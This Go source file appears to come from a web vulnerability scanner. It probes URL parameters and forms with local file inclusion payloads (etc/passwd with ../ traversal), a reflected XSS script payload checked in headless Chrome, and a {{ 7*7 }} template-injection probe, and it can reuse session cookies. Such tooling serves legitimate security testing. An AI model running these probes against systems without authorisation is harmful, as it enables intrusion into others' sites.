package main

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/chromedp/cdproto/network"
	"github.com/chromedp/chromedp"
	"golang.org/x/net/html"
)

func attackInput(baseDomain string, n *html.Node) {
	for _, attr := range n.Attr {
		if attr.Key == "type" && attr.Val == "password" && !isAuthorised {
			fmt.Println("[!] found password field on: " + baseDomain + "\nWant to use authorisation? Use the -a flag!")
		}
		if attr.Key == "type" && attr.Val == "file" {
			fmt.Println("[!] File upload detected - Link: " + baseDomain)
		}
	}

	/*
		ctx, cancel := chromedp.NewContext(
			context.Background(),
			//chromedp.WithDebugf(log.Printf),
		)
		defer cancel()

		// create a timeout
		ctx, cancel = context.WithTimeout(ctx, 15*time.Second)
		defer cancel()

		allocCtx, cancel := chromedp.NewExecAllocator(ctx,
			chromedp.Flag("headless", true),
			chromedp.Flag("disable-gpu", true),
			chromedp.Flag("no-sandbox", true),
		)
		defer cancel()

		ctx, cancel = chromedp.NewContext(allocCtx)
		defer cancel()

		// navigate to a page, wait for an element, click
		err := chromedp.Run(ctx,
			setCookie(baseDomain),
			// Navigate to domain
			chromedp.Navigate(baseDomain),
			// Load webpage
			chromedp.WaitReady("body", chromedp.ByQuery),
			// find and click "Example" link
			chromedp.Click("//input[@type='submit']", chromedp.BySearch),
		)
		if err != nil {
			if err != context.DeadlineExceeded {
				println(err)
				handleErr(err)
			}
			return
		}
	*/

	// Button found, try to do more
	//fmt.Println("[!] submit button found at " + baseDomain)
}

func setCookie(domain string) chromedp.ActionFunc {
	return chromedp.ActionFunc(func(ctx context.Context) error {

		if auth == "" {
			return nil
		}

		domainPath := strings.Split(domain, "/")

		mainDomain := domainPath[2]
		mainDomainArr := strings.Split(mainDomain, ".")
		var cookieDomain string
		if len(mainDomainArr) == 1 {
			cookieDomain = strings.Split(removeProtocol(mainDomain), ":")[0]
		} else {
			cookieDomain = "." + mainDomainArr[len(mainDomainArr)-2] + "." + mainDomainArr[len(mainDomainArr)-1]
		}

		cookieStr := strings.Split(auth, ":")

		err := network.SetCookie(cookieStr[0], cookieStr[1]).WithDomain(cookieDomain).Do(ctx)
		if err != nil {
			fmt.Errorf("error: %w", err)
		}
		return err
	})
}

func attemptLFI(domain string, client *http.Client) {
	index := strings.Index(domain, "=")
	if index != -1 {
		domain = domain[:index] + "="
	}

	payloads := []string{"etc/passwd", "etc/hosts", "Windows/System32/drivers/etc/hosts"}
	for _, payload := range payloads {
		if doLFI(domain, client, payload) {
			return
		}
	}
	return
}

func attemptURLXSS(domain string) {
	index := strings.Index(domain, "=")
	if index != -1 {
		domain = domain[:index] + "="
	}

	payloads := []string{"<script>alert(1)</script>"}
	for _, payload := range payloads {
		if doURLXSS(domain, payload) {
			return
		}
	}
}

func attemptSSTI(domain string, client *http.Client) {
	index := strings.Index(domain, "=")
	if index != -1 {
		domain = domain[:index] + "="
	}

	payloads := []string{"{{ 7*7 }}"}
	for _, payload := range payloads {
		if doSSTI(domain, client, payload) {
			return
		}
	}
}

func attemptSSTIPost(domain string, client *http.Client, name string) {
	payloads := []string{"{{ 7*7 }}"}
	for _, payload := range payloads {
		formType := url.Values{name: {payload}}
		if doSSTIPost(domain, client, formType) {
			fmt.Println("[!!!] POTENTIAL SSTI FOUND! " + domain + " Posted with: " + name + "=" + payload)
			return
		}
	}
}

func doSSTI(domain string, client *http.Client, payload string) bool {
	resp, err := client.Get(domain + payload)

	handleErr(err)
	defer resp.Body.Close()

	if resp.StatusCode <= 400 {

		if resp.StatusCode == http.StatusOK {
			bodyBytes, err := io.ReadAll(resp.Body)
			handleErr(err)
			bodyString := string(bodyBytes)

			if strings.Contains(bodyString, "49") {
				fmt.Println("[!!!] POTENTIAL SSTI FOUND! " + domain + payload)
				return true
			}
		}
	}
	return false
}

func doSSTIPost(domain string, client *http.Client, payload url.Values) bool {
	resp, err := client.PostForm(domain, payload)

	handleErr(err)
	defer resp.Body.Close()

	if resp.StatusCode <= 400 {

		if resp.StatusCode == http.StatusOK {
			bodyBytes, err := io.ReadAll(resp.Body)
			handleErr(err)
			bodyString := string(bodyBytes)

			if strings.Contains(bodyString, "49") {
				return true
			}
		}
	}
	return false
}

func doLFI(domain string, client *http.Client, payload string) bool {
	resp, err := client.Get(domain + "/" + payload)

	if err != nil && checkLFISuccess(resp) {
		defer resp.Body.Close()
		fmt.Println("[!!!] POTENTIAL LFI FOUND! " + domain + "/" + payload)
		return true
	}

	for i := range 10 {
		resp, err := client.Get(domain + strings.Repeat("../", i) + payload)
		if err != nil {
			continue
		}
		defer resp.Body.Close()
		if checkLFISuccess(resp) {
			fmt.Println("[!!!] POTENTIAL LFI FOUND! " + domain + strings.Repeat("../", i) + "etc/passwd")
			return true
		}
	}
	return false
}

func checkLFISuccess(resp *http.Response) bool {
	if resp.StatusCode <= 400 {

		if resp.StatusCode == http.StatusOK {
			bodyBytes, err := io.ReadAll(resp.Body)
			handleErr(err)
			bodyString := string(bodyBytes)

			if strings.Contains(bodyString, "root:x") || strings.Contains(bodyString, "localhost") {
				return true
			}
		}
	}
	return false
}

func doURLXSS(domain string, payload string) bool {

	for {
		if amountChromeTabs < 5 {
			break
		}
	}

	chromMu.Lock()
	amountChromeTabs++
	chromMu.Unlock()

	defer func() {
		chromMu.Lock()
		amountChromeTabs--
		chromMu.Unlock()
	}()

	ctx, cancel := chromedp.NewContext(context.Background(),
		chromedp.WithErrorf(func(format string, args ...interface{}) {
		}),
	)
	defer cancel()

	ctx, cancel = context.WithTimeout(ctx, 2*time.Second)
	defer cancel()

	alertFound := true

	// Run chromedp tasks
	err := chromedp.Run(ctx,
		setCookie(domain),
		chromedp.Navigate(domain+payload),
		// If page loads, no alert was immediately presented
		chromedp.ActionFunc(func(ctx context.Context) error {

			alertFound = false
			return nil
		}),
	)
	if err != nil {
		if err != context.DeadlineExceeded && !strings.Contains(err.Error(), "-32000") {
			handleErr(err)
		}
		// Unable to find page error
		if strings.Contains(err.Error(), "-32000") {
			return false
		}
		if alertFound {
			fmt.Println("[!!!] POTENTIAL XSS FOUND! " + domain + payload)
			return true
		}
	}

	// Print the alert message
	return false

}
